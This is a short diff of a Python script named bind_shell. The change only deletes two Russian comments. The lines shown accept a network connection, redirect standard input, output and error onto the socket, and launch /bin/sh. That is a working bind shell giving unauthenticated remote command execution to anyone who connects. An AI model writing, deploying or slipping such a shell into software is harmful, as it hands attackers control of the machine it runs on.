@@ -11,12 +11,12 @@ def bind_shell(port):
         conn, addr = s.accept()
         print(f'Connection from {addr}')
         
-        # Дублируем файловые дескрипторы соединения на stdin, stdout и stderr
+        
         os.dup2(conn.fileno(), 0)
         os.dup2(conn.fileno(), 1)
         os.dup2(conn.fileno(), 2)
 
-        # Открываем командную оболочку
+    
         os.system('/bin/sh')
 
 if __name__ == "__main__":
